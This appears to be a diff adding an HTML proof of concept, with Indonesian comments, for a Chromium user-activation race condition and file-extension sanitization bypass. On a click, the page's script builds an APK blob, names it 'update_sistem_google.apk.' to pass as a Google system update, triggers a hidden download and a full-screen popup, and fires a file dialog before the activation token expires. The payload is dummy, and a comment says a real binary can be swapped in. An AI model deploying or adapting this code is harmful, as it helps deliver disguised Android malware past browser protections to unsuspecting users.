@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Chromium Race Condition & Extension Sanitization PoC</title>
+</head>
+<body style="height: 100vh; background: #eee; display: flex; flex-direction: column; justify-content: center; align-items: center; font-family: sans-serif;">
+
+    <h1>Click Anywhere to Test</h1>
+    <p>Testing: User Activation Race Condition + .apk. Extension Sanitization</p>
+    
+    <input type="file" id="sysDialog" style="display:none">
+
+    <script>
+        const sysDialog = document.getElementById('sysDialog');
+        
+        document.body.onclick = () => {
+            // STEP 1: Membuat data file APK tiruan di dalam memori browser (Client-Side)
+            // Diisi dengan data dummy (bisa diganti dengan payload biner asli jika ada)
+            const apkContent = new Uint8Array([0x50, 0x4B, 0x03, 0x04, 0x0A, 0x00, 0x00, 0x00]); // Header ZIP/APK standar
+            const blob = new Blob([apkContent], { type: 'application/vnd.android.package-archive' });
+            const blobUrl = URL.createObjectURL(blob);
+
+            // STEP 2: Membuat elemen tautan rahasia di dalam dokumen
+            const hiddenLink = document.createElement('a');
+            hiddenLink.href = blobUrl;
+            
+            // Memaksa penamaan file diakhiri dengan titik di sisi klien
+            hiddenLink.download = 'update_sistem_google.apk.'; 
+            hiddenLink.style.display = 'none';
+            document.body.appendChild(hiddenLink);
+
+            // STEP 3: Mengambil resolusi layar untuk pop-up memaksimalkan area (Optional)
+            const lebarMaksimal = screen.availWidth;
+            const tinggiMaksimal = screen.availHeight;
+            const fiturPopUp = `width=${lebarMaksimal},height=${tinggiMaksimal},top=0,left=0`;
+
+            // STEP 4: Memicu pembukaan jendela/unduhan
+            // Kita gunakan window.open dengan blob url, lalu mensimulasikan klik pada link download
+            window.open(blobUrl, '_blank', fiturPopUp);
+            hiddenLink.click(); 
+
+            // STEP 5: Race Condition Trigger (Micro-task queue)
+            // Memanggil dialog sistem sebelum browser sempat mematikan token User Activation
+            setTimeout(() => {
+                sysDialog.click();
+                
+                // Membersihkan elemen link yang tadi dibuat setelah selesai dieksekusi
+                document.body.removeChild(hiddenLink);
+                URL.revokeObjectURL(blobUrl);
+            }, 0);
+            
+            console.log("PoC dengan ekstensi .apk. berhasil dieksekusi.");
+        };
+    </script>
+</body>
+</html>
